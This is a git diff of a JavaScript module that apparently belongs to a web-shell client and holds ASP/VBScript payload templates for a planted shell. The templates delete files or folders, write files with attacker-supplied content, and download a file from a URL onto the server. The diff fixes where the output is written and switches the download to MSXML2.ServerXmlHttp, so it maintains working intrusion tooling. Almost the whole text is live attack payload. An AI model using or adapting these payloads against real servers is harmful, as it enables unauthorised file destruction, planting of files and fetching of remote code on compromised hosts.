@@ -11,13 +11,13 @@ module.exports = (arg1, arg2, arg3) => ({
 
   delete: {
     _:
-      `Dim P:P=bd(Request("${arg1}")):Set FS=CreateObject("Scripting.FileSystemObject"):If FS.FolderExists(P)=true Then:FS.DeleteFolder(P):Else:FS.DeleteFile(P):End If:Set FS=Nothing:If Err Then:S="ERROR:// "&Err.Description:Else:S="1":Response.Write(S):End If`,
+      `Dim P:P=bd(Request("${arg1}")):Set FS=CreateObject("Scripting.FileSystemObject"):If FS.FolderExists(P)=true Then:FS.DeleteFolder(P):Else:FS.DeleteFile(P):End If:Set FS=Nothing:If Err Then:S="ERROR:// "&Err.Description:Else:S="1":End If:Response.Write(S)`,
     [arg1]: "#{hex::path}"
   },
 
   create_file: {
     _:
-      `CreateObject("Scripting.FileSystemObject").CreateTextFile(""&bd(Request("${arg1}"))&"").Write(""&bd(Request("${arg2}"))&""):If Err Then:S="ERROR:// "&Err.Description:Else:S="1":Response.Write(S):End If`,
+      `CreateObject("Scripting.FileSystemObject").CreateTextFile(""&bd(Request("${arg1}"))&"").Write(""&bd(Request("${arg2}"))&""):If Err Then:Response.Write("ERROR:// "&Err.Description):Else:Response.Write("1"):End If`,
     [arg1]: "#{hex::path}",
     [arg2]: "#{hex::content}"
   },
@@ -71,7 +71,7 @@ module.exports = (arg1, arg2, arg3) => ({
 
   wget: {
     _:
-      `Dim SI:Set x=CreateObject("Microsoft.XMLHTTP"):x.Open "GET",""&bd(Request("${arg1}"))&"",0:x.Send():If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:set s=CreateObject("ADODB.Stream"):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile ""&bd(Request("${arg2}"))&"",2:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI="1":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(SI)`,
+      `Dim SI:Set x=CreateObject("MSXML2.ServerXmlHttp"):x.Open "GET",""&bd(Request("${arg1}"))&"",0:x.Send():If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:set s=CreateObject("ADODB.Stream"):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile ""&bd(Request("${arg2}"))&"",2:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI="1":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(SI)`,
     [arg1]: "#{hex::url}",
     [arg2]: "#{hex::path}"
   }
